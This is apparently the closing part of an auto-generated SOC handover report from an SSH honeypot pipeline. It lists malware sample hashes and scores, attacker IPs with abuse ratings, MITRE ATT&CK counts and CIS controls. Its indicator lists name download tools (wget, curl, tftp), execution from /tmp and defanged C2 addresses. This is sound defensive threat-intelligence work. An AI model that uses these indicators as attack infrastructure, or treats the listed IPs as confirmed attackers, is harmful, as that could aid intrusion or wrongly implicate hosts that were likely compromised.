| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `181.177.169[.]88` | BO | Comteco Ltda | **100** ⚠️ | 4 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `138.121.202[.]90` | CO | Camara colombiana de la construcción Cam | **100** ⚠️ | 1 |
| `203.198.173[.]137` | HK | VDSL Trial Cust : Excalibur Capital Ltd | **100** ⚠️ | 50 |
| `220.246.43[.]172` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `182.72.90[.]110` | IN | SONA WINES LTD | **100** ⚠️ | 12 |
| `177.159.150[.]111` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 50 |
| `85.19.195[.]12` | NO | Telia Norge AS | **100** ⚠️ | 50 |
| `183.196.144[.]45` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 26 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 190 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 174 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 90 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 89 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 88 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 272 cases |
| Tool 34  | Credential Extractor        | ✅ 208 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (4.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 174 priority case(s) shown individually · 24 recon entry/entries in table (9 group(s) consolidating 72 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-08T21:12:36Z_
